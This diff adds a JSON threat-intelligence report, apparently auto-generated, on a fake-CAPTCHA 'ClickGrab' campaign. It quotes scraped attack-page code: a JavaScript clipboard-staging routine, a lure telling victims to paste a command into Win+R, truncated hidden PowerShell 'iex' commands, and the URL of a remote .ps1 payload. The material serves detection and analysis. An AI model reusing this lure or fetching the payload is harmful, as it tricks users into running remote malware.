@@ -1,0 +1,264 @@
+{
+  "title": "Emerging ClickGrab Campaign: Advanced Analysis of 2025-09-25 Attack Patterns",
+  "date": "2025-09-25",
+  "category": "Threat Analysis",
+  "excerpt": "Comprehensive analysis of 11 sites reveals 27.3% malicious rate with 1 PowerShell attack attempts and 8 clipboard hijacking instances.",
+  "slug": "clickgrab-analysis-2025-09-25",
+  "tags": [
+    "URL Analysis",
+    "Threat Intelligence",
+    "Malicious Domains"
+  ],
+  "read_time": 12,
+  "stats": {
+    "sites_analyzed": 11,
+    "malicious_rate": 27,
+    "attack_patterns": 22,
+    "powershell_downloads": 1,
+    "clipboard_manipulations": 8,
+    "obfuscation_score": 0,
+    "attack_sophistication": 6
+  },
+  "analysis_data": {
+    "obfuscation_analysis": {
+      "techniques": {},
+      "hex_variables": [],
+      "base64_strings": [
+        "com/recaptcha/about/images/reCAPTCHA"
+      ],
+      "obfuscation_score": 0
+    },
+    "flow_analysis": {
+      "flow_components": {
+        "Element Creation": {
+          "count": 2,
+          "description": "Creating temporary DOM elements",
+          "examples": [
+            "createElement(\"textarea\""
+          ]
+        },
+        "Content Injection": {
+          "count": 3,
+          "description": "Injecting malicious content into elements",
+          "examples": [
+            ".value =",
+            ".textContent ="
+          ]
+        },
+        "DOM Manipulation": {
+          "count": 6,
+          "description": "Adding elements to the DOM",
+          "examples": [
+            "append(",
+            "body.append"
+          ]
+        },
+        "Selection Methods": {
+          "count": 6,
+          "description": "Selecting content for copying",
+          "examples": [
+            ".select()"
+          ]
+        },
+        "Clipboard Operations": {
+          "count": 6,
+          "description": "Executing clipboard copy operations",
+          "examples": [
+            "execCommand(\"copy\""
+          ]
+        },
+        "Cleanup Operations": {
+          "count": 4,
+          "description": "Removing temporary elements",
+          "examples": [
+            "removeChild"
+          ]
+        }
+      },
+      "payload_construction": {
+        "Command Concatenation": {
+          "count": 1,
+          "examples": [
+            "commandToRun +"
+          ]
+        },
+        "Verification Text": {
+          "count": 1,
+          "examples": [
+            "\"copy\"); document.body.removeChild(tempTextA... ...ck\", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; checkboxBtnSpinner.style.animation = \"spin 1s linear infinite\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = \"0\"; checkboxBtnSpinner.style.animation = \"none\"; setTimeout(function() { checkboxBtnSpinner.style.visibility = \"hidden\"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = \"hidden\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaCheckbox() { checkboxBtn.style.width = \"100%\"; checkboxBtn.style.height = \"100%\"; checkboxBtn.style.borderRadius = \"2px\"; checkboxBtn.style.margin = \"21px 0 0 12px\"; checkboxBtn.style.opacity = \"1\"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = \"4px\"; checkboxBtn.style.height = \"4px\"; checkboxBtn.style.borderRadius = \"50%\"; checkboxBtn.style.marginLeft = \"25px\"; checkboxBtn.style.marginTop = \"33px\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"hidden\"; checkboxBtnSpinner.style.opacity = \"0\"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = \"none\"; verifywindow.style.visibility = \"hidden\"; verifywindow.style.opacity = \"0\"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== \"none\" && verifywindow.style.display !== \"\"; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(\"textarea\"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = \" # \" const ploy = \"\u00e2\u009c ''I am not a robot - reCAPTCHA Verification Hash: \" const end = \"''\" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()... ...dy.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\");... ...32.ps1 | iex' -WindowStyle Hidden\\\"\"; const commandToRun = \"powershell \" + htaPath; stageClipboa... ...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText... ...k\", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; checkboxBtnSpinner.style.animation = \"spin 1s linear infinite\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = \"0\"; checkboxBtnSpinner.style.animation = \"none\"; setTimeout(function() { checkboxBtnSpinner.style.visibility = \"hidden\"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = \"hidden\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaCheckbox() { checkboxBtn.style.width = \"100%\"; checkboxBtn.style.height = \"100%\"; checkboxBtn.style.borderRadius = \"2px\"; checkboxBtn.style.margin = \"0\"; checkboxBtn.style.opacity = \"1\"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = \"4px\"; checkboxBtn.style.height = \"4px\"; checkboxBtn.style.borderRadius = \"50%\"; checkboxBtn.style.marginLeft = \"25px\"; checkboxBtn.style.marginTop = \"33px\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"hidden\"; checkboxBtnSpinner.style.opacity = \"0\"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = \"none\"; verifywindow.style.visibility = \"hidden\"; verifywindow.style.opacity = \"0\"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== \"none\" && verifywindow.style.display !== \"\"; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(\"textarea\"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = \" # \" const ploy = \"\u00e2\u009c ''I am not a robot - reCAPTCHA Verification ID: \" const end = \"''\" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\");... ...cation-id').textContent = verification_id; const commandToRun = `POWerShEll -W h \"[Text.Encoding]::UTF8.GetString... <img src=\"https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png\" class=\"captcha-logo line-normal\" alt=\"\"> ...=\"\" id=\"spinner\"> </div> <div id=\"verify-window\" class=\"verify-window\"> <div class=\"verify-container\"> <header class=\"verify-header\"> <span class=\"verify-header-text-medium m-p block\">Complete these</span> <span class=\"verify-header-text-big m-p block\">Verification Steps</span> <span class=\"verify-header-text-medium m-p block\"></span> </header> <main class=\"verify-main\"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class=\"fab fa-windows\"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> \u00e2\u009c \"I am not a robot - reCAPTCHA Verification Hash: <span id=\"verification-id\">1110</span>\" </code> </p> </main> </div> <footer class=\"verify-container verif... <div class=\"verify-footer-left\"> Perform the steps above to finish verification. </div> <p class=\"im-not-a-robot m-p line-normal\">I'm not a robot</p> <img src=\"https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png\" class=\"captcha-logo line-normal\" alt=\"\"> ...<div class=\"overlay\" id=\"overlay\"></div> <div class=\"recaptcha-box\"> <h2>Verify You Are Human</h2> <p>Please verify that you are a human to continue.</p> <div class=\"container m-p\"> <div id=\"checkbox-window\" class=\"checkbox-window m-p block\"> <div class=\"checkbox-container m-p\"> <button type=\"button\" id=\"checkbox\" class=\"checkbox m-p line-normal\"></button> </div> <p style=\"margin: 0 !important;\" cla... ...id=\"spinner\"> </div> <div id=\"verify-window\" class=\"verify-window\"> <div class=\"verify-container\"> <header class=\"verify-header\"> <span class=\"verify-header-text-medium m-p block\">Complete these</span> <span class=\"verify-header-text-big m-p block\">Verification Steps</span> <span class=\"verify-header-text-medium m-p block\"></span> </header> <main class=\"verify-main\"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class=\"fab fa-windows\"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> \u00e2\u009c \"I am not a robot - reCAPTCHA Verification ID: <span id=\"verification-id\">146820</span>\" </code> </p> </main> </div> <footer class=\"verify-container veri... <div class=\"verify-footer-left\"> Perform the steps above to finish verification. </div> <title>Verify You Are Human</title> <h2>Verify You Are Human</h2> <p style=\"margin: 0 !important;\" class=\"im-not-a-robot m-p line-normal\">I'"
+          ]
+        },
+        "Hash Generation": {
+          "count": 1,
+          "examples": [
+            "verification_id){ const suffix = \" # \" const ploy = \"\u00e2\u009c ''I am not a robot - reCAPTCHA Verification Hash: \" const end = \"''\" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()... ...dy.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\");... ...32.ps1 | iex' -WindowStyle Hidden\\\"\"; const commandToRun = \"powershell \" + htaPath; stageClipboa... ...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText... ...k\", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; checkboxBtnSpinner.style.animation = \"spin 1s linear infinite\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = \"0\"; checkboxBtnSpinner.style.animation = \"none\"; setTimeout(function() { checkboxBtnSpinner.style.visibility = \"hidden\"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = \"hidden\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaCheckbox() { checkboxBtn.style.width = \"100%\"; checkboxBtn.style.height = \"100%\"; checkboxBtn.style.borderRadius = \"2px\"; checkboxBtn.style.margin = \"0\"; checkboxBtn.style.opacity = \"1\"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = \"4px\"; checkboxBtn.style.height = \"4px\"; checkboxBtn.style.borderRadius = \"50%\"; checkboxBtn.style.marginLeft = \"25px\"; checkboxBtn.style.marginTop = \"33px\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"hidden\"; checkboxBtnSpinner.style.opacity = \"0\"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = \"none\"; verifywindow.style.visibility = \"hidden\"; verifywindow.style.opacity = \"0\"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== \"none\" && verifywindow.style.display !== \"\"; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(\"textarea\"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = \" # \" const ploy = \"\u00e2\u009c ''I am not a robot - reCAPTCHA Verification ID: \" const end = \"''\" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\");... ...cation-id').textContent = verification_id; const commandToRun = `POWerShEll -W h \"[Text.Encoding]::UTF8.GetString... <img src=\"https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png\" class=\"captcha-logo line-normal\" alt=\"\"> ...=\"\" id=\"spinner\"> </div> <div id=\"verify-window\" class=\"verify-window\"> <div class=\"verify-container\"> <header class=\"verify-header\"> <span class=\"verify-header-text-medium m-p block\">Complete these</span> <span class=\"verify-header-text-big m-p block\">Verification Steps</span> <span class=\"verify-header-text-medium m-p block\"></span> </header> <main class=\"verify-main\"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class=\"fab fa-windows\"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> \u00e2\u009c \"I am not a robot - reCAPTCHA Verification Hash: <span id=\"verification-id\">1110</span>\" </code> </p> </main> </div> <footer class=\"verify-container verif... <div class=\"verify-footer-left\"> Perform the steps above to finish verification. </div> <p class=\"im-not-a-robot m-p line-normal\">I'm not a robot</p> <img src=\"https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png\" class=\"captcha-logo line-normal\" alt=\"\"> ...<div class=\"overlay\" id=\"overlay\"></div> <div class=\"recaptcha-box\"> <h2>Verify You Are Human</h2> <p>Please verify that you are a human to continue.</p> <div class=\"container m-p\"> <div id=\"checkbox-window\" class=\"checkbox-window m-p block\"> <div class=\"checkbox-container m-p\"> <button type=\"button\" id=\"checkbox\" class=\"checkbox m-p line-normal\"></button> </div> <p style=\"margin: 0 !important;\" cla... ...id=\"spinner\"> </div> <div id=\"verify-window\" class=\"verify-window\"> <div class=\"verify-container\"> <header class=\"verify-header\"> <span class=\"verify-header-text-medium m-p block\">Complete these</span> <span class=\"verify-header-text-big m-p block\">Verification Steps</span> <span class=\"verify-header-text-medium m-p block\"></span> </header> <main class=\"verify-main\"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class=\"fab fa-windows\"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> \u00e2\u009c \"I am not a robot - reCAPTCHA Verification ID: <span id=\"verification-id"
+          ]
+        },
+        "Comment Injection": {
+          "count": 2,
+          "examples": [
+            "# \" const ploy = \""
+          ]
+        }
+      },
+      "attack_sophistication": 6,
+      "total_techniques": 27
+    },
+    "keyword_analysis": {
+      "categories": {
+        "Social Engineering": [
+          "Robot",
+          "verification",
+          "robot",
+          "To better prove you are not a robot",
+          "verification-id",
+          "Verification ID",
+          "Verification Hash",
+          "I am not a robot",
+          "CAPTCHA Verification",
+          "verification_id",
+          "Verify You Are Human",
+          "Verification"
+        ],
+        "Verification Text": [
+          "hidden",
+          "Hidden"
+        ],
+        "Technical Terms": [
+          "iex"
+        ]
+      },
+      "similar_groups": [
+        [
+          "CAPTCHA Verification",
+          "Verification",
+          "verification"
+        ],
+        [
+          "Verification Hash",
+          "verification-id",
+          "verification_id",
+          "Verification ID"
+        ],
+        [
+          "Robot",
+          "robot"
+        ],
+        [
+          "Hidden",
+          "hidden"
+        ]
+      ],
+      "frequency": [
+        [
+          "CAPTCHA Verification",
+          2
+        ],
+        [
+          "I am not a robot",
+          2
+        ],
+        [
+          "Robot",
+          2
+        ],
+        [
+          "robot",
+          2
+        ],
+        [
+          "Verification",
+          2
+        ],
+        [
+          "verification",
+          2
+        ],
+        [
+          "verification-id",
+          2
+        ],
+        [
+          "verification_id",
+          2
+        ],
+        [
+          "To better prove you are not a robot",
+          2
+        ],
+        [
+          "iex",
+          2
+        ],
+        [
+          "hidden",
+          2
+        ],
+        [
+          "Verification Hash",
+          1
+        ],
+        [
+          "Hidden",
+          1
+        ],
+        [
+          "Verification ID",
+          1
+        ],
+        [
+          "Verify You Are Human",
+          1
+        ]
+      ],
+      "total_unique": 15,
+      "total_count": 26
+    },
+    "domain_counts": [
+      [
+        "godprox.cc",
+        6
+      ],
+      [
+        "www.webgo.de",
+        5
+      ],
+      [
+        "www.google.com",
+        4
+      ],
+      [
+        "t.me",
+        3
+      ],
+      [
+        "use.fontawesome.com",
+        2
+      ],
+      [
+        "irp.cdn-website.com",
+        1
+      ],
+      [
+        "www.1c-bitrix.ru",
+        1
+      ]
+    ],
+    "url_patterns": {
+      "reCAPTCHA imagery": {
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png": 2
+      },
+      "Font resources": {
+        "https://use.fontawesome.com/releases/v5.0.0/css/all.css": 2
+      },
+      "CDN hosted scripts": {
+        "https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1": 1
+      },
+      "Google resources": {
+        "https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png": 2,
+        "https://www.google.com/intl/en/policies/privacy/": 1,
+        "https://www.google.com/intl/en/policies/terms/": 1
+      }
+    }
+  }
+}
